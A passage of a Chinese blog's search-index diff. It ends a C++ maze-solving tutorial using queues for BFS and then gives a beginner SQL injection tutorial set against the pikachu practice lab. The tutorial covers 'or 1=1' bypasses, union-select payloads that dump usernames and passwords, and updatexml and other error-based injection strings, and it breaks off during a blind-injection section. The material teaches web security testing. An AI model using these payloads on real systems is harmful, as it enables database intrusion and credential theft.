class="comment">//出栈</span></span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top==<span class="number">-1</span>) <span class="comment">//栈空</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    e=s-&gt;data[s-&gt;top];</span><br><span class="line">    s-&gt;top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stack_GetTop</span><span class="params">(SqStack *&amp;s,ElemType &amp;e)</span></span>&#123; <span class="comment">//取栈顶元素但是不出栈</span></span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top==<span class="number">-1</span>) <span class="comment">//栈空</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    e=s-&gt;data[s-&gt;top]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、使用队列来进行广度优先搜索找到最优路径"><a href="#2、使用队列来进行广度优先搜索找到最优路径" class="headerlink" title="2、使用队列来进行广度优先搜索找到最优路径"></a>2、使用队列来进行广度优先搜索找到最优路径</h2><h3 id="（1）存放迷宫的数据结构-1"><a href="#（1）存放迷宫的数据结构-1" class="headerlink" title="（1）存放迷宫的数据结构"></a>（1）存放迷宫的数据结构</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">//该方块的行号</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">//该方块的列号</span></span><br><span class="line">    <span class="keyword">int</span> di; <span class="comment">//该方块的前一个方块在队列中的位置</span></span><br><span class="line">&#125;box;</span><br><span class="line"><span class="keyword">typedef</span> box ElemType;</span><br></pre></td></tr></table></figure>
+
+<p>如上方代码块所示，为存放迷宫的一个格子的数据结构体，与前一个思路不同的是，这里的<code>di</code>存放的实际是该方块的前一个方块在队列中的位置，对于每次循环，从队列头拿出一个格子，然后将与之相邻并且可走的格子入队列，循环往复，当某个格子恰好为终点，一路逆向寻找其<code>di</code>值直到找到终点，此时的路径便是最短路径</p>
+<p>在该问题中，因为当元素出队列之后，我们仍然需要该元素的信息，所以不能使用环形队列，如下方代码块所示：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    box data[MAX_STACK];</span><br><span class="line">    <span class="keyword">int</span> front,rear;</span><br><span class="line">&#125;SqQuene;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）函数主体-1"><a href="#（2）函数主体-1" class="headerlink" title="（2）函数主体"></a>（2）函数主体</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maze2</span><span class="params">(<span class="keyword">int</span> xi,<span class="keyword">int</span> yi,<span class="keyword">int</span> xe,<span class="keyword">int</span> ye)</span></span>&#123; <span class="comment">//使用队列来进行广度优先搜索找到最优路径，(xi,yi)为起点，(xe,ye)为终点</span></span><br><span class="line">    box e;</span><br><span class="line">    <span class="keyword">int</span> i,j,d1,i1,j1;</span><br><span class="line">    SqQuene *qu;</span><br><span class="line">    <span class="built_in">Quene_Ini</span>(qu); <span class="comment">//初始化队列</span></span><br><span class="line">    e.i=xi;e.j=yi;e.di=<span class="number">-1</span>; <span class="comment">//此时的di其实是该方块的前一个方块在队列中的位置</span></span><br><span class="line">    <span class="comment">/*此时的e是迷宫的起点*/</span></span><br><span class="line">    <span class="built_in">Quene_Push</span>(qu,e); <span class="comment">//将起点入队列</span></span><br><span class="line">    mg[xi][yi]=<span class="number">-1</span>; <span class="comment">//将起点设置为已走过</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">Quene_Empty</span>(qu)!=<span class="number">1</span>)&#123; <span class="comment">//队列不空时循环</span></span><br><span class="line">        <span class="built_in">Quene_Pop</span>(qu,e); <span class="comment">//出队列</span></span><br><span class="line">        i=e.i;</span><br><span class="line">        j=e.j;</span><br><span class="line">        <span class="keyword">if</span>(i==xe &amp;&amp; j==ye)&#123; <span class="comment">//找到了出口</span></span><br><span class="line">            <span class="built_in">change</span>(qu); <span class="comment">//对迷宫进行小小的处理</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(d1=<span class="number">0</span>;d1&lt;<span class="number">4</span>;d1++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(d1)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:i1=i<span class="number">-1</span>;j1=j;<span class="keyword">break</span>; <span class="comment">//向上</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:i1=i;j1=j+<span class="number">1</span>;<span class="keyword">break</span>; <span class="comment">//向右</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:i1=i+<span class="number">1</span>;j1=j;<span class="keyword">break</span>; <span class="comment">//向下</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:i1=i;j1=j<span class="number">-1</span>;<span class="keyword">break</span>; <span class="comment">//向左</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(mg[i1][j1]==<span class="number">0</span>)&#123; <span class="comment">//没走过并且不是障碍</span></span><br><span class="line">                e.i=i1;</span><br><span class="line">                e.j=j1;</span><br><span class="line">                e.di=qu-&gt;front; <span class="comment">//指向路径中上一个方块的下标</span></span><br><span class="line">                <span class="built_in">Quene_Push</span>(qu,e); <span class="comment">//入队列</span></span><br><span class="line">                mg[i1][j1]=<span class="number">-1</span>; <span class="comment">//设置为已经走过</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Quene_Destroy</span>(qu);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以这样通俗地理解，假设一个会分身的忍者从起点开始寻找终点，他不用走，而是往自己的相邻格子处召唤一个分身，分身也可以在与自己相邻的格子召唤分身，忍者一层层的分身如同波一样扩散开来，每个分身只需要记住自己的位置，自己是从哪个地方分出来的，如果有一个分身碰到了终点，然后便将其逆向收回，便得到了最短路径</p>
+<p>所以我们还要做的事，便是找到这条忍者分身逆向一层层收回的路径，回到这个问题中，便是通过<code>di</code>来索引到路径中每个方块的前一个方块，并且标记之，最后标记到的路径，便是所求路径：</p>
+<p>需要引入函数<code>change()</code>来对迷宫做出处理，代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(SqQuene *qu)</span></span>&#123; <span class="comment">//对以qu结点为终点的路径的对应队列进行处理</span></span><br><span class="line">    box e;</span><br><span class="line">    e=qu-&gt;data[qu-&gt;front];</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        mg[e.i][e.j]=<span class="number">2</span>; <span class="comment">//将对应路径上的格子设置为2</span></span><br><span class="line">        e=qu-&gt;data[e.di];</span><br><span class="line">    &#125;<span class="keyword">while</span>(e.di!=<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与此同时，<code>output</code>函数也需要做出一些改动：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(mg[i][j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="keyword">break</span>;<span class="comment">//障碍物</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);<span class="keyword">break</span>;<span class="comment">//空地</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">&quot;●&quot;</span>);<span class="keyword">break</span>;<span class="comment">//路径</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）有关队列的基础函数"><a href="#（3）有关队列的基础函数" class="headerlink" title="（3）有关队列的基础函数"></a>（3）有关队列的基础函数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Quene_Ini</span><span class="params">(SqQuene *&amp;Q)</span></span>&#123; <span class="comment">//初始化一个队列</span></span><br><span class="line">    Q=(SqQuene*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(SqQuene));</span><br><span class="line">    Q-&gt;front=Q-&gt;rear=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Quene_Destroy</span><span class="params">(SqQuene *&amp;Q)</span></span>&#123; <span class="comment">//销毁一个队列</span></span><br><span class="line">    <span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Quene_Empty</span><span class="params">(SqQuene *&amp;Q)</span></span>&#123; <span class="comment">//判断一个队列是否为空</span></span><br><span class="line">    <span class="keyword">return</span>(Q-&gt;front==Q-&gt;rear);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Quene_Push</span><span class="params">(SqQuene *&amp;Q, ElemType e)</span></span>&#123; <span class="comment">//进队列</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear&gt;=MAX_STACK<span class="number">-1</span>) <span class="comment">//队满上溢出</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Q-&gt;rear++;</span><br><span class="line">    Q-&gt;data[Q-&gt;rear]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Quene_Pop</span><span class="params">(SqQuene *&amp;Q, ElemType &amp;e)</span></span>&#123; <span class="comment">//出队列</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front==Q-&gt;rear) <span class="comment">//队空下溢出</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Q-&gt;front++;</span><br><span class="line">    e=Q-&gt;data[Q-&gt;front];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>bug储藏室</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>图</tag>
+        <tag>栈</tag>
+        <tag>队列</tag>
+        <tag>递归</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入【基础】</title>
+    <url>/2021/04/30/SQL%E6%B3%A8%E5%85%A5%E3%80%90%E5%9F%BA%E7%A1%80%E3%80%91/</url>
+    <content><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>原理：SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。</p>
+<h2 id="1、库、表、列"><a href="#1、库、表、列" class="headerlink" title="1、库、表、列"></a>1、库、表、列</h2><p>库，即数据库，其中存放着数据表，使用 “show databases”语句可以查询后台所有数据库的名称。</p>
+<p><img src="https://i.loli.net/2021/01/18/TOBDlZW2eifyaUI.png" alt="image-20201109201621667"></p>
+<p>其中 information_schema是一个存放有重要信息的数据库，如：</p>
+<img src="https://i.loli.net/2020/11/09/5m3CYo68JSX1Kr2.png" alt="image-20201109202953795" style="zoom:33%;" />
+
+<p>数据库包含数据表，上图中每一行所显示的都是数据表的表名，其中值得关注的是 “tables” 与 “columns”</p>
+<p><strong>information_schema.tables中包含着整个库中的所有的表名</strong></p>
+<p>其中需要我们注意的有 “table_schema” “table_name”两列，其分别代表着我们想查找的表所在的数据库名及其表名。</p>
+<p><strong>information_schema.columns中包含着整个库中的所有表中的所有的列名</strong></p>
+<h2 id="2、使用sql语句进行数据查询的流程"><a href="#2、使用sql语句进行数据查询的流程" class="headerlink" title="2、使用sql语句进行数据查询的流程"></a>2、使用sql语句进行数据查询的流程</h2><h3 id="1、首先确定数据库的相关信息"><a href="#1、首先确定数据库的相关信息" class="headerlink" title="1、首先确定数据库的相关信息"></a>1、首先确定数据库的相关信息</h3><h4 id="（1）确定数据库名"><a href="#（1）确定数据库名" class="headerlink" title="（1）确定数据库名"></a>（1）确定数据库名</h4><p>首先介绍database()函数，该函数能够返回目前所在（所使用）的数据库名，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<p>使用select函数（用于从数据库中选取数据结果被存储在一个结果表中，称为结果集）可以输出该函数的返回值（数据库名）</p>
+<h4 id="（2）确定数据表名"><a href="#（2）确定数据表名" class="headerlink" title="（2）确定数据表名"></a>（2）确定数据表名</h4><p>如上方所述，information_schema.tables表中的table_schema列存放着所有数据表对应的数据库名，table_name列存放着所有的数据表名，这时候只需要查询table_schema为database()的table_name数据结果，便可以知道目前所在的数据库中所有的数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| httpinfo   |</span><br><span class="line">| member     |</span><br><span class="line">| message    |</span><br><span class="line">| users      |</span><br><span class="line">| xssblind   |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）确定数据表中的列名"><a href="#（3）确定数据表中的列名" class="headerlink" title="（3）确定数据表中的列名"></a>（3）确定数据表中的列名</h4><p>information_schema.columns表中的table_name列存放着所有的列所在的数据表名，column_name列存放着所有的列的列名，这时候只需要查询table_name为在上一步中得到的表名信息中的某个表的表名的column_name数据结果，便可以知道该表中的所有列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">| level       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>（注意表名，如’users’带单引号）</p>
+<h3 id="2、查询目标信息"><a href="#2、查询目标信息" class="headerlink" title="2、查询目标信息"></a>2、查询目标信息</h3><h4 id="（1）查询目标列的所有数据"><a href="#（1）查询目标列的所有数据" class="headerlink" title="（1）查询目标列的所有数据"></a>（1）查询目标列的所有数据</h4><p>可以使用select函数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select (列名) from (表名);</span><br></pre></td></tr></table></figure>
+
+<p>其中列名可以有多个，使用逗号连接，表名只能有一个</p>
+<h4 id="（2）查询目标列的目标数据"><a href="#（2）查询目标列的目标数据" class="headerlink" title="（2）查询目标列的目标数据"></a>（2）查询目标列的目标数据</h4><p>可以使用select函数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select (被查询列名) from (表名) where (指定列名&#x3D;xx);</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、联合注入"><a href="#3、联合注入" class="headerlink" title="3、联合注入"></a>3、联合注入</h2><p>联合注入的基本思路是，通过页面后端自带的MySQL的查询语句来进行注入，通过构成闭合来查询其他的内容</p>
+<h3 id="（1）万能钥匙"><a href="#（1）万能钥匙" class="headerlink" title="（1）万能钥匙"></a>（1）万能钥匙</h3><p>以下是一个基本的select查询语句，用于实现输入id查询用户的用户名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username from users where id&#x3D;xx;</span><br></pre></td></tr></table></figure>
+
+<p>其中xx为用户在页面所输入的payload，传至后端与MySQL语句相拼接，进行查询操作，如果我们在payload中动一些手脚，比如，构造闭合之后在后方加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>并且将后方的额外语句注释掉之后，将可以查询出user表中username列的所有数据，故称万能钥匙</p>
+<h3 id="（2）union联合查询"><a href="#（2）union联合查询" class="headerlink" title="（2）union联合查询"></a>（2）union联合查询</h3><p>以上的万能钥匙只能遍历出原来列中的所有内容，如果需要查询其他列中的内容，就必须使用union构成联合查询语句，构造闭合之后在后方加上：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (被查询列名) from (表名) where (指定列名&#x3D;xx)</span><br></pre></td></tr></table></figure>
+
+<p>其中where语句可以省略，并且后方需要加上注释符号</p>
+<p>值得重点注意的地方是，被查询列名的数量必须与union前的主查询语句中的被查询列名的数量一致，不够的用1进行补齐，此时问题在于，如何确定主查询语句中查询对象的数量？</p>
+<h4 id="order-by语句确定查询对象的数量"><a href="#order-by语句确定查询对象的数量" class="headerlink" title="order by语句确定查询对象的数量"></a>order by语句确定查询对象的数量</h4><p>使用order by语句，即在原查询语句构造闭合之后，加上：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by x</span><br></pre></td></tr></table></figure>
+
+<p>并且将后方进行注释，x从1开始，意为对第x列进行排序，当x增加到大于主查询语句中所查询的列的数量时，便会报错 Unknown column ‘x’ in ‘order clause’ 此时便可以确定原查询语句中查询对象的数量</p>
+<p>接下来介绍一个实用函数：</p>
+<h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>group_concat()函数能够将多行记录进行连接并且使用逗号进行分割，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,table_name from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>以上语句的查询结果为：</p>
+<img src="https://i.loli.net/2021/01/20/CutNSPlvdp78Whi.png" alt="image-20210120210710205" style="zoom:67%;" />
+
+<p>而如果改为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>则以上语句的查询结果为：</p>
+<img src="https://i.loli.net/2021/01/20/p9I2JhEstqCBGH3.png" alt="image-20210120210833498" style="zoom:67%;" />
+
+<h4 id="一次完整的联合查询注入"><a href="#一次完整的联合查询注入" class="headerlink" title="一次完整的联合查询注入"></a>一次完整的联合查询注入</h4><p>（1）首先确定主查询语句的查询的列名数量为2：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 2#</span><br></pre></td></tr></table></figure>
+
+<p>（2）确定所在的库中的数据表的名称：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,table_name from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>（3）确定列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>（4）查询密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select username,password from users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、报错注入"><a href="#4、报错注入" class="headerlink" title="4、报错注入"></a>4、报错注入</h2><p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容，如果能让错误信息中返回数据库中的内容，即实现SQL注入</p>
+<p>最经典的报错注入：基于updatexml()函数的注入：</p>
+<h3 id="（1）updatexml-函数"><a href="#（1）updatexml-函数" class="headerlink" title="（1）updatexml()函数"></a>（1）updatexml()函数</h3><p>该函数的作用是：改变（查找并替换）XML文档中符合条件的节点的值，其中包含三个参数：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">updatexml(xml_document,XPathstring,new_value)</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数：fiedname是String格式，为表中的字段名</p>
+<p>第二个参数：XPathstring（XPath格式的字符串）</p>
+<p>第三个参数：new_value（用于替换查找到的符合条件的节点的值）</p>
+<p>其中XPath定位必须是有效的，否则会发生报错，于是我们可以在第二个参数之中填入所需的语句，后台将对该语句进行解析并把运行结果返回在报错信息中，这就是报错注入。</p>
+<h3 id="（2）concat-函数"><a href="#（2）concat-函数" class="headerlink" title="（2）concat()函数"></a>（2）concat()函数</h3><p>updatexml()函数的报错内容需要经过处理才能被完整地输出出来，否则会把一部分内容吃掉，所以必须使用concat()函数，</p>
+<p>该函数的作用是，将传入的两个字符串进行拼接，其中如果是sql语句作为参数，concat()函数会将这个语句的表达结果作为字符串然后进行拼接操作，最后输出结果为一个字符串，这样便可以传入updatexml()函数中。</p>
+<h3 id="（3）进行updatexml注入"><a href="#（3）进行updatexml注入" class="headerlink" title="（3）进行updatexml注入"></a>（3）进行updatexml注入</h3><p>在构造闭合之后，在后方加上以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(所要查询的语句)),0)#</span><br></pre></td></tr></table></figure>
+
+<p>最前面的减号用在构造闭合之后进行两个函数的连接，最后的#号用于构造闭合，而0x7e所代表的便是字符 “~”（也可以换用其他字符）</p>
+<p>完整的操作流程：</p>
+<p>（1）确定数据库中所有数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),0)#</span><br></pre></td></tr></table></figure>
+
+<p>（2）确定数据表中所有列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)),0)#</span><br></pre></td></tr></table></figure>
+
+<p>（3）输出id 账号 以及 密码</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(id) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）limit语句"><a href="#（4）limit语句" class="headerlink" title="（4）limit语句"></a>（4）limit语句</h3><p>当输出结果有多行时，一般想到使用group_concat语句，但是如果该语句被过滤，可以使用limit语句进行替代，比如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>以上将会输出列中第一行的结果，而如果将 “limit 0,1” 改为 “limit 1,1” ，将会输出第二行的结果</p>
+<h3 id="（5）substr-函数输出长字符结果"><a href="#（5）substr-函数输出长字符结果" class="headerlink" title="（5）substr()函数输出长字符结果"></a>（5）substr()函数输出长字符结果</h3><p>如果输出结果太长，将无法在报错语句中被完整地输出出来，这时可以使用substr()函数将结果进行分节输出，这个函数的用法为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr(str,a,b)</span><br></pre></td></tr></table></figure>
+
+<p>其中str为需要进行截取的字符串名，a, b为整数，表示从a位置开始，截取b个字符，返回截取后的字符串。</p>
+<p>在语句中使用的实例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((select group_concat(password) <span class="keyword">from</span> users),<span class="number">10</span>,<span class="number">10</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>可以将结果一截截地输出</p>
+<h3 id="（6）其他的一些报错注入语句"><a href="#（6）其他的一些报错注入语句" class="headerlink" title="（6）其他的一些报错注入语句"></a>（6）其他的一些报错注入语句</h3><h4 id="基于extractvalue-函数的报错注入"><a href="#基于extractvalue-函数的报错注入" class="headerlink" title="基于extractvalue()函数的报错注入"></a>基于extractvalue()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-extractvalue(1,concat(0x7e,(所要查询的语句),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于geometrycollection-函数的报错注入"><a href="#基于geometrycollection-函数的报错注入" class="headerlink" title="基于geometrycollection()函数的报错注入"></a>基于geometrycollection()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-geometrycollection((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multipoint-函数的报错注入"><a href="#基于multipoint-函数的报错注入" class="headerlink" title="基于multipoint()函数的报错注入"></a>基于multipoint()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-multipoint((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于polygon-函数的报错注入"><a href="#基于polygon-函数的报错注入" class="headerlink" title="基于polygon()函数的报错注入"></a>基于polygon()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">polygon((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multipolygon-函数的报错注入"><a href="#基于multipolygon-函数的报错注入" class="headerlink" title="基于multipolygon()函数的报错注入"></a>基于multipolygon()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-multipolygon((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于linestring-函数的报错注入"><a href="#基于linestring-函数的报错注入" class="headerlink" title="基于linestring()函数的报错注入"></a>基于linestring()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-linestring((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multilinestring-函数的报错注入"><a href="#基于multilinestring-函数的报错注入" class="headerlink" title="基于multilinestring()函数的报错注入"></a>基于multilinestring()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-multilinestring((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于exp-函数的报错注入"><a href="#基于exp-函数的报错注入" class="headerlink" title="基于exp()函数的报错注入"></a>基于exp()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-exp(~(select * from(所要查询的语句)a))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于floor-函数的报错注入"><a href="#基于floor-函数的报错注入" class="headerlink" title="基于floor()函数的报错注入"></a>基于floor()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-(select 1 from select count(*),concat())</span><br></pre></td></tr></table></figure>
+
+<p>以上的数中报错注入方式都可以按照sql注入的基本流程进行</p>
+<h2 id="5、盲注"><a href="#5、盲注" class="headerlink" title="5、盲注"></a>5、盲注</h2><h3 id="基于boolean的盲注"><a href="#基于boolean的盲注" class="headerlink" title="基于boolean的盲注"></a>基于boolean的盲注</h3><p>有时候网页会对返回的内容进行高强度过滤，只有两种返回值，我们可以称之为真和假，比如，在pikachu靶场中，当语句的逻辑值为真时，返回：</p>
+<img src="https://i.loli.net/2021/02/24/EY1caHIVih6RnPr.png" alt="image-20210224221114926" style="zoom:67%;" />
+
+<p>当语句的逻辑值为假，返回：</p>
+<img src="https://i.loli.net/2021/02/24/wt4mVcWd3y6Qlx2.png" alt="image-20210224221354197" style="zoom:67%;" />
+
+<p>这时候我们查看页面源代码，发现不同之处在于：</p>
+<p><img src="https://i.loli.net/2021/02/24/5za2bMyrXTYHQtq.png" alt="image-20210224221459645"></p>
+<p>于是我们尝试对回显语句进行抓包：</p>
